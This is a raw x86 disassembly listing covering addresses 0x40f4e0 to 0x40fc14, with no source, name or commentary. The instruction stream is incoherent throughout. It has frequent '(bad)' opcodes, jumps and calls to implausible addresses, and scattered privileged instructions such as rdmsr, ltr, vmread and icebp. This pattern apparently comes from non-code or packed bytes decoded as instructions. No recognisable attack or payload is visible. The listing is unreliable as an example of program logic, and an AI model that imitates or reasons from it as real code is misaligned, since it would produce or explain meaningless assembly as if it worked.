  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
